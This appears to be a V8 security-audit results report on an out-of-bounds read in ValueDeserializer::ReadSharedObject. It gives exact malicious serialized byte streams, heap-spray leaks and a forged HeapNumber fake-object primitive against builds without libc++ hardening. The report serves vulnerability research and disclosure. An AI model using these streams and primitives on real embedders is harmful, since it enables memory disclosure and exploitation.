@@ -1,0 +1,232 @@
+====================================================================
+RESULTS — ValueDeserializer::ReadSharedObject / GetPersisted OOB read
+Date: 2026-10-13   Sandbox: /tmp/v8-audit/v8build/v8 (v8 15.7.63 @ 1c7163e4,
+worktree carries the unrelated d183128 patch from the WasmMemory task)
+Resource rule obeyed: ninja only ever with -j6; harness compiles/links are
+single clang++/ld.lld invocations.
+====================================================================
+
+TARGET (byte-verified in this exact tree)
+-----------------------------------------
+- kSharedObject tag: 0x70 ('p')  (src/objects/value-serializer.cc:210)
+  note: 0x75 ('u') = kSharedArrayBuffer (line 208) — earlier note's '/0x75'
+  was the SAT tag, not shared-object.
+- Version gate: ReadObject() switch, "case kSharedObject:
+  if (version_ >= 15) return ReadSharedObject();" -> stream must be v15+.
+  Streams used: ff 0f 70 <u32-LEB128(K)>  (header ff 0f = kVersion 15).
+- ReadSharedObject @ value-serializer.cc:2616-2646 (verbatim-confirmed):
+    uint32_t shared_object_id; ReadVarint<uint32_t>() -> attacker-controlled
+    ...
+    shared_object_conveyor_->GetPersisted(shared_object_id)
+- GetPersisted @ src/handles/shared-object-conveyor-handles.h:44-45:
+    44  DCHECK(HasPersisted(object_id));
+    45  return *shared_objects_[object_id];
+  std::vector<Handle<HeapObject>>; Handle = 8-byte pointer-to-slot.
+  OOB semantics (release, hardening off):
+    S = *(uint64_t*)(vec.begin + 8*K)   (faulting insn: mov (%rax,%r15,8),%rax)
+    T = *(uint64_t*)S                   (next insn:       mov (%rax),%rsi)
+    T -> DirectHandle<HeapObject> -> AddObjectWithID -> returned to caller
+    and to JS/API as the deserialized value.
+
+CONVEYOR SETUP (clean public-API route, works — no internal factory needed):
+  --harmony-struct; JS creates N `new SharedStructType(['x'])` instances;
+  public ValueSerializer with delegate.AdoptSharedValueConveyor RETAINS the
+  moved conveyor; a second deserialize pass uses a delegate whose
+  GetSharedValueConveyor returns it. d8-mirroring delegates in
+  harness_sobj.cc (SerDelegate/DeserDelegate).
+
+BUILD MATRIX (all out/r release, is_debug=false dcheck_always_on=false):
+  A) out/d debug            : DCHECK active (Stage 0)
+  B) out/r harness_sobj     : DEFAULT v8 standalone release config
+     (_LIBCPP_HARDENING_MODE=_LIBCPP_HARDENING_MODE_EXTENSIVE, comes from
+      build_overrides/build.gni `enable_safe_libcxx = true`)
+  C) out/r harness_sobj_nh  : identical tree/objects EXCEPT
+     src/objects/value-serializer.o recompiled with
+     _LIBCPP_HARDENING_MODE=_LIBCPP_HARDENING_MODE_NONE — a one-flag,
+     -O3-preserving stand-in for embedder builds configured
+     enable_safe_libcxx=false / MSVC-STL / libstdc++ (no _GLIBCXX_ASSERTIONS).
+     Same binary layout otherwise (same rsp of d8 link inputs).
+
+====================================================================
+STAGE 0 (debug sanity) — VERDICT: CONFIRMED, guard exists only in debug
+====================================================================
+01. out/d ./harness_sobj s1 4 2147483647
+    stream: ff 0f 70 ff ff ff ff 07
+    => "# Fatal error in ../../src/handles/shared-object-conveyor-handles.h,
+        line 44 / Debug check failed: HasPersisted(object_id)."
+    stack via ... ReadValue(api) -> harness.    EXIT=133 (SIGTRAP)
+    log: s0_debug_dcheck.log
+
+====================================================================
+STAGE 1 (baseline, release) — VERDICT: PASSED
+====================================================================
+02. out/r harness_sobj / harness_sobj_nh  : `pop 4` (in-bounds K=3,
+    stream ff 0f 70 03) => identity-with-last=true x=259, EXIT=0.
+    Conveyor adopt/retain/reuse works on both binaries.
+    logs: s1_r_baseline.log, s2_nh_baseline.log (baseline re-done after all
+    edits: h_base.log on hardened build, still EXIT=0)
+
+====================================================================
+STAGE 2 (crash-level OOB, release) — VERDICT: CONFIRMED, two configs
+====================================================================
+2a. DEFAULT (EXTENSIVE hardening) build:
+03. harness_sobj s1 4 2147483647 (K=0x7fffffff):
+    "vector.h:419: libc++ Hardening assertion __n < size() failed: vector[]
+     index out of bounds"  EXIT=134 (SIGABRT)        [h_hugeK.log]
+04. harness_sobj s2 4 6: same SIGABRT (all OOB K abort, any K > size-1)
+                                                        [h_smallK.log]
+    => on default-config release the missing DCHECK is BACKSTOPPED by the
+       hardened-libc++ element check: controlled abort (DoS-only there).
+
+2b. hardening-NONE build (embedder-config equivalent):
+05. K=0x7fffffff, N=4  => SIGSEGV EXIT=139.   [s2_r_nh_hugeK.log,
+                                             s2_r_nh_hugeK_gdb.txt]
+    gdb: #0 GetPersisted shared-object-conveyor-handles.h:45
+         #1 ReadSharedObject value-serializer.cc:2644
+         #2 ReadObject value-serializer.cc:1681  #4 ReadValue api.cc:3834
+         insn: mov (%rax,%r15,8),%rax
+         rax(vec begin)=0x7f000074e20  r15=0x7fffffff
+         si_addr = 0x7f400074e18 = begin + 8*K exactly (~34 GiB above base,
+                   unmapped).
+06. Small-K sweep one-past-size (N=4), no grooming, 20-run matrix with heap
+    warmup variance (WARM env, JS allocation churn), K in {4,5,6}:
+      total: 16/20 SIGSEGV, 2/20 clean value return, 2/20 SIGTRAP
+      per-K: K=4 6/6 SIGSEGV; K=5 6/7 SIGSEGV + 1 clean value;
+             K=6 3/7 SIGSEGV, 2/7 clean value, 2/7 SIGTRAP
+      SIGTRAP class diagnosed: OOB slot yielded an ODD tagged word
+      (e.g. raw=0x000078f4001ca58d) => returned as HeapObject; IsNumber/
+      IsObject/IsString all 0; touching it from JS ran into V8 fatal
+      handling (dump w/ ObjectCacheKey <JSGlobalProxy>). HeapObject-form
+      uncontrolled OOB reaches JS-land too.   [det_s2.log, k6_3041.log]
+07. K=7..10 x 4 runs each, WARM=i*997:
+      K=7: 2x SEGV, 2x clean   K=8: 4x SEGV   K=9: 4x SEGV   K=10: 3x SEGV,
+      1x clean                 [s2_sweep_k7_10.log]
+    Rationale: slots just past the 32-byte vector chunk hold PA poison/zero/
+    neighbor chunk metadata; deref'ing them (2nd load) faults unless the
+    neighboring qword happens to contain a canonical mapped pointer whose *S
+    is a legal tagged word (then no crash — that's the Stage-3b leak).
+
+====================================================================
+STAGE 3 (infoleak) — VERDICT: CONFIRMED, three strengths
+====================================================================
+Smi encoding fact (this build, empirically): Smi payload = (low32(word))>>1;
+low bit = tag. (The prior-analysis "value = word>>32" was wrong: planting
+1337<<32 yielded JS value 0; planting 1337<<1 yields 1337.)
+
+3a. CONTROLLED Smi leak (groomed):
+08. s3a (C++ malloc spray, 2048..8192 x 32KiB chunks all holding &control_block;
+    control block qword0 = 0x0000000000000a72 = Smi(1337)):
+    forward scan (forked child) finds 8.37 MILLION slot hits nearest at
+    K~1.94M (~15 MB above vector base) e.g.
+    stream ff 0f 70 bc dc 76  (K=1945148)
+    => raw tagged of result = 0x0000000000000a72
+       [api] IsNumber=1  IntegerValue=1337
+       [js] typeof v => "number"   ''+v => "1337"
+       post-full-GC: still number/1337. EXIT=0.
+    20/20 runs leaked the planted value (det_s3a.log; v1337count=2 both
+    attack repetitions). log: s3_controlled_smi.log
+
+09. s3jsa (PURE-JS spray: 2048-8192 ArrayBuffers x 32KiB, bytes = &cb):
+    stream ff 0f 70 8a 8e 04 (K=67338) => ''+v => "1337", typeof number,
+    post-GC stable, EXIT=0.  [s3js_spray.log]
+    17/20 runs leak; 3/20 rc=66 graceful "no cb hit within 1536MB cap"
+    (spray did not reach the forward window that run; straightforward
+    larger-spray mitigation exists). det_s3jsa.log
+
+3b. UNCONTROLLED Smi leak (adjacent-memory disclosure, NO aiming):
+10. s3a with S3_EVENSEL selecting a scanned slot whose S points to mapped
+    memory with even *S, e.g. K=50751 (stream ff 0f 70 bf 8c 03):
+    => raw tagged = 0x00005985ed067060
+       typeof v = "number", ''+v = "-159172560"   (leaked heap qword)
+    EXIT=0.  [s3_uncontrolled_smi.log]
+11. Zero-spray variant: plain small-K on ungroomed heap (s2 mode):
+    K=6 WARM=1462 => raw=0x00003e0800efc078  ''+v => 7856188    EXIT=0
+    K=6 WARM=3041 => raw=0x000060b867731e60  => 867798832        EXIT=133*
+    K=6 WARM=1000 => raw=0x00005b20131e1e60  ''+v => 160370480  EXIT=0
+      (*3041 flip-flopped across reruns between clean-Smi 133/0 and
+       odd-word HeapObject fatal — layout-sensitive)
+    => heap-adjacent memory contents are returned to JS as numbers with no
+    grooming at all, heap-layout dependent.  [k6_1000.log, k6_3041.log]
+
+====================================================================
+STAGE 4 (fake HeapObject chain) — VERDICT: CONFIRMED
+====================================================================
+12. S3_T=fakenum, s3a (malloc spray), stream ff 0f 70 bd 9c 76 (K=1936957):
+    control block qword0 = odd tagged word = cage_base | fake_c32 | 1 where
+    fake_c32 points at e0+4 inside a JS FixedDoubleArray's elements (in-cage,
+    attacker-writable doubles): bytes [e0+4..e0+7] = real HeapNumber map c32
+    (0x00000515, borrowed at runtime from a real 13.37 HeapNumber),
+    [e0+8..e0+15] = payload double bit pattern 0x1337133713371337.
+    GetPersisted returns odd word -> treated as HeapObject:
+      raw tagged of result = 0x0000137901082c19
+      [api] IsNumber=1
+      [js] typeof v => "number"
+      [js] ''+v   => 4.183559446463817e-216
+                  (== struct.unpack('<d', 0x1337133713371337): bit-exact)
+    => a fully attacker-fabricated HeapNumber (map + value) round-trips
+    through the deserializer into JS. This is a fake-object primitive
+    (any map word / fields forgeable the same way).
+    GC HAZARD (documented): forcing full GC afterwards evacuates the host
+    array's page -> the returned tagged pointer dangles -> SIGSEGV reading
+    0x...082c18 in v8-sandbox region. Pre-GC usage is stable (shown twice).
+    Note: ArrayBuffer backing stores are NOT usable hosts here: they live
+    outside the 4 GiB compression cage (observed rel = 0x100000000);
+    FixedDoubleArray elements are the in-cage alternative used.
+    log: s4_fakenum.log
+
+====================================================================
+CLASSIFICATION (per mission taxonomy)
+====================================================================
+  - aliased existing shared obj ......... shown (pop 4: identity true)
+  - pure crash .......................... shown (hardened: SIGABRT all K>N;
+                                          nh: SIGSEGV huge-K, most small-K)
+  - garbage Smi (uncontrolled read) ..... shown (Stage 3b, JS numbers from
+                                          adjacent heap, EXIT=0)
+  - controlled Smi leak ................. shown (Stage 3a, ''+v === "1337",
+                                          both C++-spray and pure-JS-spray)
+  - HeapObject chain / fake object ...... shown (Stage 4, fake HeapNumber
+                                          returning attacker double bits)
+EXPLOITATION GATEKEEPER: which STL hardening the embedder build uses.
+  * V8 standalone default / Chrome-style EXTENSIVE libc++ hardening:
+    every OOB K aborts via vector.h element check (SIGABRT) — DoS only.
+  * enable_safe_libcxx=false / non-hardened STL (MSVC release, libstdc++
+    w/o _GLIBCXX_ASSERTIONS): full two-deref OOB read -> infoleak +
+    fake-object primitive as demonstrated on harness_sobj_nh (identical code,
+    identical -O3, only the libc++ hardening define differs for the TU).
+
+HARNESS-ARTIFACT NOTE (facts, for repro): block-scanning ~500+ MB of
+mincore-queried range recovers many SIGSEGVs from PartitionAlloc PROT_NONE
+(quarantine) windows on the main thread; afterwards the first NEW
+Script::Compile crashes inside JSDispatchTable::TryAllocateEntry (entry
+.byte +0x3210 fixed offset). Spray-without-scan controls are clean (3/3
+EXIT=0). Mitigation used: probe scripts pre-compiled pre-scan; memory scan
+runs in a fork()ed child whose layout snapshot is COW-identical, so results
+apply to the pristine parent. Suspected interaction between bulk fault
+recovery and V8 lazy-committed pointer tables; not investigated further
+(sidestepped, does not affect the attack path results above).
+
+EXACT STREAMS USED
+  in-bounds sanity   ff 0f 70 03                       (K=3)
+  huge-K crash       ff 0f 70 ff ff ff ff 07           (K=0x7fffffff)
+  controlled leak    ff 0f 70 bc dc 76 [bd dc 76]      (K=1945148/1945149)
+  JS-spray leak      ff 0f 70 8a 8e 04                 (K=67338)
+  uncontrolled leak  ff 0f 70 bf 8c 03                 (K=50751)
+  fake object        ff 0f 70 bd 9c 76                 (K=1936957)
+  (LEB128 of uint32; tag 0x70 'p'; header ff 0f = version 15)
+
+KEY LOGS/ARTIFACTS (/tmp/v8-audit/f3v/)
+  harness_sobj.cc             final harness (modes pop/dump/s1/s2/s3/s3js/
+                              s3a/s3jsa, fork-scan, fakenum, WARM knob)
+  compile_sobj_r.sh           hardened-default release link recipe
+  compile_sobj_r_noharden.sh  hardening-NONE release link recipe
+  s0_debug_dcheck.log         Stage 0 (EXIT 133, DCHECK line 44)
+  h_hugeK.log h_smallK.log    Stage 2a hardened SIGABRT (EXIT 134)
+  s2_r_nh_hugeK.log + _gdb.txt Stage 2b SIGSEGV @begin+8K (EXIT 139)
+  det_s2.log s2_sweep_n4.log s2_sweep_k7_10.log   small-K matrices (20+ runs)
+  k6_3041.log k6_1000.log ...   K=6 variance classes (HeapObject-fatal /
+                                clean Smi leak)
+  s3_controlled_smi.log det_s3a.log (20/20) s3js_spray.log det_s3jsa.log
+                              (17/20) s3_uncontrolled_smi.log  Stage 3
+  s4_fakenum.log              Stage 4 fake HeapNumber + post-GC hazard
+  s3a_ctrl_sprayonly.log bisect_noscan.log          harness-artifact controls
+====================================================================
